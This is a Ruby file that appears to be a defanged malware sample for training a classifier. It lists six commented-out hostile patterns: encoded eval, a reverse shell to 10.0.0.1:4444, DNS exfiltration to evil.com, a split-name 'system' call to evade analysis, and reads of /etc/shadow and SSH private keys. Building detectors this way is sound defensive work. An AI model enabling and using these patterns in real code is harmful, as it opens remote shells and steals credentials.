# frozen_string_literal: true

# SAMPLE MALICIOUS SCRIPT -- FOR TESTING ONLY
# This file demonstrates common malicious Ruby patterns for training
# the ML classifier. All dangerous operations are COMMENTED OUT.
#
# Classification: MALICIOUS
# Techniques: T1059.007 (eval), T1027 (obfuscation), T1048 (exfiltration)

require 'base64'
require 'socket'
require 'json'

# Pattern 1: Base64-encoded eval
# This is the most common Ruby malware pattern
encoded_payload = Base64.strict_encode64('puts "This would be malicious code"')
# DISABLED: eval(Base64.decode64(encoded_payload))

# Pattern 2: Multi-layer encoding
layer1 = Base64.strict_encode64('system("whoami")')
layer2 = Base64.strict_encode64(layer1)
# DISABLED: eval(Base64.decode64(Base64.decode64(layer2)))

# Pattern 3: Reverse shell attempt
# DISABLED: TCPSocket.open("10.0.0.1", 4444) { |s| ... }

# Pattern 4: Data exfiltration via DNS
# DISABLED: Resolv::DNS.open { |dns| dns.getresource("#{data}.evil.com", Resolv::DNS::Resource::IN::TXT) }

# Pattern 5: Dynamic method invocation to evade static analysis
method_name = ['sys', 'tem'].join
# DISABLED: Kernel.send(method_name, 'id')

# Pattern 6: Reading sensitive files
sensitive_paths = ['/etc/passwd', '/etc/shadow', '~/.ssh/id_rsa']
# DISABLED: sensitive_paths.each { |p| File.read(p) }

puts '[TEST] This script contains malicious patterns for ML training only'
